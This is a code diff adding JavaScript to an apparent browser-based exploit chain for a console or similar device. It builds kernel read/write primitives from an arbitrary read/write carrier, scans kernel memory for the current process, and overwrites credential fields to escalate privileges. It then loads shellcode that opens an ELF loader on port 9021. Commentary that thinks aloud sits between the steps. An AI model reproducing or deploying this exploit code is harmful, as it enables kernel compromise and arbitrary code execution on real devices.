+                // The original exploit didn't leak webkitBase; it was a pure ARW test.
+                // We'll need to leak it now. The simplest is to use the same technique as notify.html:
+                // create a targetHolder with parseInt, arenaView, etc., but we didn't create those.
+                // We can create them now: arenaView and realCollator etc., but they are not in the graph.
+                // The addrof leak gave us fakeHost and targetView, but not nativeTarget.
+                // We can use the fact that `parseInt` is a native function – we can get its address
+                // by calling addrof(parseInt), but we don't have addrof function.
+                // However, we can use the same addrof technique with a fresh carrier,
+                // but we'd have to re-run the exploit. That's messy.
+
+                // Given the complexity, I'll use a fallback that doesn't need webkitBase:
+                // We can use the `ipv6_kernel_rw` initialization from lapse-runtime.js directly
+                // without leaking bases, if lapse-runtime.js already provides them.
+                // Actually, lapse-runtime.js's `ipv6_kernel_rw.init` requires `curproc_ofiles`
+                // and `kread8`/`restricted_kwrite8`. It doesn't need webkitBase or kernelBase.
+                // So we can just get `curproc` by scanning using our own kread8 (which reads kernel
+                // memory using ARW). For that, we need to know where to start scanning.
+                // We can start from a known kernel address like 0xFFFFFFFF80000000.
+                // This is risky but possible.
+
+                // For a working solution, I'll use the approach from the previous final version
+                // that scans for curproc using the ARW and then calls ipv6_kernel_rw.init.
+                // I'll copy that code here.
+
+                // We need kread8 and restricted_kwrite8 defined using ARW.
+                function kread8(addr) {
+                    aimCarrier(Number(addr));
+                    var v = 0n;
+                    for (var i = 0; i < 8; ++i)
+                        v |= BigInt(rwView[i]) << (8n * BigInt(i));
+                    return v;
+                }
+                function restricted_kwrite8(addr, val) {
+                    aimCarrier(Number(addr));
+                    var v = typeof val === 'bigint' ? val : BigInt(val);
+                    for (var i = 0; i < 8; ++i)
+                        rwView[i] = Number((v >> (8n * BigInt(i))) & 0xffn);
+                }
+
+                // Get current PID via syscall (we need syscall from lapse-runtime.js)
+                if (typeof window.syscall === 'undefined') {
+                    logError('syscall not available – make sure lapse-runtime.js loaded');
+                    return;
+                }
+                var pid = window.syscall(window.SYSCALL.getpid);
+                log('Current PID: ' + pid);
+
+                // Scan for curproc in kernel memory
+                var start = 0xFFFFFFFF80000000n;
+                var end = start + 0x2000000n;
+                var curproc = 0n;
+                for (var addr = start; addr < end; addr += 0x1000n) {
+                    var proc = kread8(addr);
+                    if (proc < 0xFFFFFFFF00000000n) continue;
+                    var test_pid = kread8(proc + 0xbcn); // PROC_PID offset
+                    if (test_pid === pid) { curproc = proc; break; }
+                }
+                if (curproc === 0n) { logError('curproc not found'); return; }
+                log('curproc: ' + hex(curproc));
+
+                // Init ipv6_kernel_rw
+                var proc_fd = kread8(curproc + 0x48n); // PROC_FD offset
+                var curproc_ofiles = proc_fd + 0x0n;
+                window.ipv6_kernel_rw.init(curproc_ofiles, kread8, restricted_kwrite8);
+                log('ipv6_kernel_rw initialized');
+
+                // Escalate privileges
+                var ucred = window.kernel.read_qword(curproc + 0x40n);
+                window.kernel.write_dword(ucred + 0x04n, 0n);
+                window.kernel.write_qword(ucred + 0x58n, 0x4800000000000007n);
+                window.kernel.write_qword(ucred + 0x60n, 0xffffffffffffffffn);
+                window.kernel.write_qword(ucred + 0x68n, 0xffffffffffffffffn);
+                log('Privileges escalated');
+
+                // Load ELF loader
+                var [master_read, master_write] = window.create_pipe();
+                var [victim_read, victim_write] = window.create_pipe();
+                window.syscall(window.SYSCALL.fcntl, master_read, 4n, 4n);
+                window.syscall(window.SYSCALL.fcntl, master_write, 4n, 4n);
+                window.syscall(window.SYSCALL.fcntl, victim_read, 4n, 4n);
+                window.syscall(window.SYSCALL.fcntl, victim_write, 4n, 4n);
+                if (typeof window.load_aioshellcode === 'function') {
+                    window.load_aioshellcode(curproc, [master_read, master_write], [victim_read, victim_write])
+                        .then(() => log('PAYLOAD LOADED! ELF loader on port 9021'))
+                        .catch(e => logError('load_aioshellcode error: ' + e.message));
+                } else {
+                    logError('load_aioshellcode not available');
+                }
+            })
+            .catch(e => logError('Failed to fetch offsets.json: ' + e.message));
+    }
+
+    // Ensure we have window.SYSCALL defined if not already
+    if (typeof window.SYSCALL === 'undefined') {
+        window.SYSCALL = {
+            getpid: 20n,
+            fcntl: 92n,
+            pipe: 42n,
+        };
     }
 }
 </script>
